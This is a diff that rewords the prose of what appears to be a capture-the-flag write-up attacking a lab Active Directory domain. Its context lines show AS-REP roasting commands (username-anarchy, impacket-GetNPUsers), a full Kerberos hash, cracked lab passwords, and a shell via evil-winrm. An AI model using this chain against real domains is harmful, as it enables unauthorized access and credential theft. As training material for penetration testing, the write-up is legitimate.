@@ -69,8 +69,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-- Guest can list SMB shares
-- LDAP anonymous bind turned up nothing
+Guest can list SMB shares, and LDAP anonymous bind turned up nothing.
 
 # User
 
@@ -91,7 +90,7 @@ Sophie Driver
 
 > https://github.com/urbanadventurer/username-anarchy
 
-Generates the realistic candidates from the name list:
+It generates realistic candidates from the name list:
 
 ```sh
 ./username-anarchy --input-file users.txt --select-format flast,first.last > usersmod.txt
@@ -118,7 +117,7 @@ Check which accounts have Kerberos pre-authentication disabled with `GetNPUsers`
 impacket-GetNPUsers EGOTISTICAL-BANK.local/ -usersfile usersmod.txt -no-pass -dc-ip 10.129.4.220
 ```
 
-`fsmith` had pre-auth disabled — back to rockyou for the hash:
+`fsmith` had pre-auth disabled — so it was back to rockyou to crack the hash:
 
 ```text
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:dac22607b313e98a6c99d9277ee84cea$d921f7cf82e87331758f38bb7f93449cdc36a273d6fb79f4ef1ac1a845afde5333d0b747d95f2794e92fc1c89253123357af4a944e971cba22308fa89b3f4184e2fdb3cb494b41eb4a66ff3249f26e00dfd251e48e61b5d2d7748369d1a3865c8155a28fca870f8946d4fd29941094973205e66e4760534ba7eac2d041906bac59f475237ae287ae0441cd442785e83a9f2cb45e93c44d268ece988693689b07bd0b6bbf539ab6e19fcdc4d517ec6bdf62d4556bd47a5dd3c3f2091438c27fc04611dc11fb8bc570ddb8fa84c403dbc964636560a912f29cc31bd510020ac964a0771f390462ec8eb721116961e7264d13cf545b0f7eb96994bc2a312049e99e
@@ -128,7 +127,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:dac22607b313e98a6c99d9277ee84cea$d92
 
 > `fsmith - Thestrokes23`
 
-Shell through evil-winrm, then run WinPEAS and SharpHound for the lay of the land. WinPEAS checks the registry for cleartext passwords of accounts configured for autologin — and this box obliged:
+Get a shell through evil-winrm, then run WinPEAS and SharpHound for the lay of the land. WinPEAS checks the registry for cleartext passwords of accounts configured for autologin — and this box obliged:
 
 > `svc_loanmanager - Moneymakestheworldgoround`
 
